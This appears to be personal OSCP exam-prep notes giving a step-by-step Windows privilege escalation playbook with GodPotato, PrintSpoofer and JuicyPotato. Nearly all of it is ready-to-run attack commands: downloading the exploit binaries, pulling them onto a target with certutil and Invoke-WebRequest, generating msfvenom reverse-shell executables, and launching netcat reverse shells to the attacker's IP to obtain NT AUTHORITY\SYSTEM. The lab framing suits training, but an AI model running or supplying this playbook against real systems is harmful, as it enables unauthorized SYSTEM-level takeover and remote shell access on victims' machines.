## Step 1: Verify Your Architecture & OS Version

Before dropping a payload, you need to know whether the target is 32-bit or 64-bit, and roughly how old it is, so you pick the right exploit binary.

Run these two commands in your shell:

```
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -ep bypass
```

```powershell
powershell [Environment]::Is64BitOperatingSystem
```

CMD

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

```
wmic os get osarchitecture
```

- **`x64-based PC`** means you are running a **64-bit** operating system.
- **`X86-based PC`** means you are running a **32-bit** operating system.

## Step 2: Choose Your Exploit Tool

Depending on the Windows version you discovered in Step 1, select your tool from the **"Potato" family**:

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
```

```
reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
```

### Quick Rule of Thumb (Manual Check)

If you don't want to run a full scanner, you can determine the right tool in 5 seconds using `ver`:

DOS

```
C:\> ver
Microsoft Windows [Version 10.0.10586]
```

- **Build $< 17763$** (Before Win 10 1809 / Server 2019) $\rightarrow$ **JuicyPotato.exe**
    
- **Build $\ge 17763$** (Win 10 1809+, Server 2019/2022) $\rightarrow$ **GodPotato.exe** or **RoguePotato.exe**

| Potato        | General Windows compatibility                              | Important conditions                                                      |
| ------------- | ---------------------------------------------------------- | ------------------------------------------------------------------------- |
| JuicyPotato   | Windows Server 2008–2016; Windows 10 up to 1803            | DCOM/COM impersonation; vulnerable configurations and suitable CLSID      |
| RoguePotato   | Windows Server 2019 / Windows 10 1809+                     | Requires an OXID resolver setup                                           |
| PrintSpoofer  | Windows Server 2016 / 2019; Windows 10                     | Requires `SeImpersonatePrivilege` and accessible Print Spooler            |
| GodPotato     | Windows Server 2012–2022; Windows 8–11                     | Compatibility depends on build and patch level                            |
| JuicyPotatoNG | Modern Windows versions, including Server 2016-era systems | Different implementation from classic JuicyPotato; check its requirements |

| Rank | Potato        | Reliability assessment                                                                                 |
| ---- | ------------- | ------------------------------------------------------------------------------------------------------ |
| 1    | PrintSpoofer  | Very reliable when its OS and Print Spooler prerequisites are met                                      |
| 2    | GodPotato     | Broad compatibility; often a strong first choice on newer Windows                                      |
| 3    | JuicyPotato   | Can be very reliable on compatible older systems, but CLSID and DCOM requirements make it more finicky |
| 4    | JuicyPotatoNG | Useful alternative, but don't assume it fixes every classic JuicyPotato failure                        |
| 5    | RoguePotato   | More environmental dependencies, particularly its OXID resolver setup                                  |

---
## GodPotato.exe

Find out highest .NET version installed
```
reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP" /s | findstr /i "version"
```

```
cd ~/Desktop/Tools/Potatoes &&
```

.NET 2
```
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET2.exe -O GodPotato.exe
```

.NET 35
```
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET35.exe -O GodPotato.exe
```

.NET 4
```
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -O GodPotato.exe
```

Transfer onto target

```
cd ~/Desktop/Tools/Potatoes && python3 -m http.server 80
```

On WINDOWS target

POWERSHELL
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `iwr -uri http://${KaliIP}/GodPotato.exe -OutFile C:\\\Windows\\\Tasks\\\GodPotato.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
OR
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil.exe -urlcache -split -f http://${KaliIP}/GodPotato.exe C:\\\Windows\\\Tasks\\\GodPotato.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```

Start a listener on KALI ATTACKER
```
cd ~/Desktop/Tools && python3 penelope.py -p 135 -O / --oscp-safe
```

Transfer [[Netcat.exe]] to target
nc.exe > 32 bit
nc64.exe > 64 bit

```
cd ~/Desktop/Tools/NC && python -m http.server 80
```

nc.exe
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `C:\\\Windows\\\System32\\\certutil.exe -urlcache -split -f http://${KaliIP}/nc.exe C:\\\Windows\\\Tasks\\nc.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
nc64.exe
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `C:\\\Windows\\\System32\\\certutil.exe -urlcache -split -f http://${KaliIP}/nc64.exe C:\\\Windows\\\Tasks\\nc.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
Catch a reverse connection on the listener (CMD)
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `GodPotato -cmd "C:\\\Windows\\\Tasks\\nc.exe -t -e C:\\\Windows\\\System32\\\cmd.exe ${KaliIP} 135"`;

dv.paragraph("```bash\n" + command + "\n```");
```


---
## Printspoofer.exe

Condition, PrintSpooler must be running.

```
sc.exe query Spooler
```

### Method 1 : Spawn a SYSTEM process and interact with it
#### Transfer exe 

```
cd ~/Desktop/Tools/Potatoes && python -m http.server 80
```

(x86) 32 bit
```
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe -O PrintSpoofer.exe
```

 (x64) 64 bit
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil -urlcache -split -f http://${KaliIP}/PrintSpoofer64.exe PrintSpoofer64.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```

POWERSHELL
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = ` iwr -uri http://${KaliIP}/PrintSpoofer.exe -OutFile C:\Windows\Tasks\PrintSpoofer.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
OR
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil.exe -urlcache -split -f http://${KaliIP}/PrintSpoofer.exe C:\\\Windows\\\Tasks\\\PrintSpoofer.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
C:\Windows\Tasks\PrintSpoofer.exe -i -c cmd
```

### Method 1 : Trigger netcat and get RCE

.\PrintSpoofer64.exe -c "C:\Users\charlotte\Desktop\nc64.exe 192.168.45.178 135 -e cmd"

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `.\\\PrintSpoofer64.exe -c "C:\\\Users\\\charlotte\\\Desktop\\\\nc64.exe ${KaliIP} 135 -e cmd"`;

dv.paragraph("```bash\n" + command + "\n```");
```


---

### Option B: Legacy Windows (Windows 7/8, Server 2008/2012)

- **Tool:** **`JuicyPotato.exe`** or **`SweetPotato.exe`**
    
- **Why:** These abuse the classic COM/RPC configuration vulnerabilities present in older Windows builds.
    

## Step 3: Transfer the Exploit to the Target

Use your Kali machine to host the binary, and pull it down via your active Windows shell using PowerShell's native file transfer capabilities.

```
 cd ~/Desktop/Tools/Potatoes && python3 -m http.server 80
```

POWERSHELL
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = ` iwr -uri http://${KaliIP}/PrintSpoofer64.exe -OutFile C:\Windows\Tasks\PrintSpoofer.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
OR
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil.exe -urlcache -split -f http://${KaliIP}/JuicyPotato.exe C:\\\Windows\\\Tasks\\\JuicyPotato.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```

## Step 4: Execute and Escalate

### If using PrintSpoofer:

`PrintSpoofer` is incredibly elegant because it can interactively elevate your existing shell without needing a separate listener.

Run the following command to instantly upgrade your session:

DOS

```
C:\Windows\Tasks\PrintSpoofer.exe -i -c cmd
```

- `-i` instructs the tool to interact with the current session.
    
- `-c cmd` specifies the command interpreter to launch.
    

### If using GodPotato / JuicyPotato:

| Windows version | Base build | JuicyPotato          |
| --------------- | ---------- | -------------------- |
| Server 2012     | 9200       | Generally compatible |
| Server 2012 R2  | 9600       | Generally compatible |
| Server 2016     | 14393      | Generally compatible |
| Server 2019     | 17763      | Not compatible       |
| Server 2022     | 20348      | Not compatible       |

If you are using a variation that requires triggering a reverse shell back to you, generate an unencoded payload or executable using `msfvenom` or a simple PowerShell one-liner, start a second Netcat listener on Kali, and run:

On PANE1
```
cd ~/Desktop/Tools/Potatoes
```
ON PANE2 
```
python3 penelope.py -p 9768 -O / --oscp-safe
```

(x86) 32 bit
```
wget https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe -O JuicyPotatox32.exe
```

 (x64) 64 bit
```
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```

MSFVENOM

(x32)
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `msfvenom -p windows/shell_reverse_tcp LHOST=${KaliIP} LPORT=9768 -f exe -o shell.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
(x64)
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${KaliIP} LPORT=9768 -f exe -o shell.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
python3 -m http.server 80
```

ON WINDOWS MACHINE

```
cd C:\Windows\Tasks
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil.exe -urlcache -split -f http://${KaliIP}/shell.exe C:\\\Windows\\\Tasks\\\shell.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
Modify JuicyPotato or JuicyPotatox32.exe
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil.exe -urlcache -split -f http://${KaliIP}/JuicyPotato.exe C:\\\Windows\\\Tasks\\\JuicyPotato.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
Now you execute JuicyPotato. You must feed it the path to your payload (`-p`), a unique CLSID (a COM server ID string), and a local port to bound to (`-l`).

```
C:\Windows\Tasks\JuicyPotato.exe -t * -p C:\Windows\Tasks\shell.exe -l 9768 -c "{4991d34b-80a1-4291-83b6-3328366b9097}
```

## Step 5: Verify Your Sovereignty

If the exploit succeeds, your prompt will look exactly the same, but your privileges will have changed entirely. Type the following command to confirm your success:

DOS

```
whoami
```

> **Expected Output:** `nt authority\system`

You can now navigate straight to `C:\Users\Administrator\Desktop` to collect your flag.